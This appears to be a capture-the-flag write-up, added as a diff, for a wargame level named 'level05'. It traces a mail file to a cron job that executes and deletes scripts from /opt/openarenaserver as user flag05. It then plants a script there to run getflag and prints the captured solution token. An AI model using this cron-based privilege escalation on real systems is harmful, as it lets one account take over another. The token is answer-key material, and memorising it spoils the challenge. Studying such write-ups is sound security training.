@@ -1,0 +1,49 @@
+Notes:
+    Upon login, output in terminal:
+        `You have new mail.`
+    _
+    `find / -type f -name "*mail*" 2>/dev/null`
+    Lots of files
+    _
+    find / -group mail 2>/dev/null
+    A dozen files, more interesting
+    `
+    /usr/bin/dotlockfile
+    /usr/bin/mail-lock
+    /usr/bin/mail-touchlock
+    /usr/bin/mail-unlock
+    /var/mail
+    /var/mail/level05
+    /rofs/usr/bin/dotlockfile
+    /rofs/usr/bin/mail-lock
+    /rofs/usr/bin/mail-touchlock
+    /rofs/usr/bin/mail-unlock
+    /rofs/var/mail
+    /rofs/var/mail/level05
+    `
+    _
+    `cat /var/mail/level05`
+    output: `*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`
+    _
+    `cat /usr/sbin/openarenaserver`
+    `
+    #!/bin/sh
+    for i in /opt/openarenaserver/* ; do
+    	(ulimit -t 5; bash -x "$i")
+    	rm -f "$i"
+    done
+    `
+    _
+    Main idea is to have a bash script that executes 'getflag' as flag05 via the crontab job/task and outputs it to a file in /tmp
+    Script is created using vim
+    script.sh:
+        `#!/bin/sh
+        getflag > /tmp/my_flag.txt
+        `
+    Wait 2 minutes for job to run.
+    >> `cat /tmp/my_flag.txt`
+    `Check flag.Here is your token : viuaaale9huek52boumoomioc`
+    We have token!!
+
+    token:
+        `viuaaale9huek52boumoomioc`
